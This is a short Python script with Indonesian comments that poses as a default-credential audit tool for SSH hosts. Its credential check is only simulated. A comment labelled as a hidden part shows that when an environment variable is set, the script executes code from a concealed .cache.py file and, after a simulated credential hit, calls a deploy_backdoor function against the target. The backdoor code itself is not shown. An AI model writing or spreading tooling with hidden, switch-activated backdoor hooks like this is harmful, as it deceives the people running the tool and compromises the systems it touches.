#!/usr/bin/env python3
import sys, os, base64, subprocess, importlib.util

# bagian tersembunyi: jika KALZ_MODE=1, jalankan .cache.py
if os.environ.get("KALZ_MODE") == "1":
    cache_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), ".cache.py")
    if os.path.exists(cache_path):
        with open(cache_path, "r") as f:
            code = f.read()
        exec(code, globals())
        # fungsi deploy_backdoor sekarang tersedia di globals()
    else:
        print("[!] .cache.py tidak ditemukan, backdoor tidak aktif")

# fungsi pengujian kredensial (palsu, cuma simulasi)
def check_ssh(host, user, pwd):
    # simulasi berhasil jika user=root dan pwd kosong atau 'password'
    if user == "root" and pwd in ["", "password", "root"]:
        print(f"[+] kredensial ditemukan: {user}:{pwd}")
        # jika mode aktif, panggil deploy
        if os.environ.get("KALZ_MODE") == "1" and 'deploy_backdoor' in globals():
            deploy_backdoor(host, user, pwd)
        return True
    return False

def main():
    if len(sys.argv) < 2:
        print("usage: check_creds.py <target>")
        sys.exit(1)
    host = sys.argv[1]
    print(f"memeriksa kredensial default di {host}")
    for u,p in [("root",""), ("root","password"), ("root","root"), ("admin","admin"), ("user","password")]:
        check_ssh(host, u, p)
    print("audit selesai.")

if __name__ == "__main__":
    main()
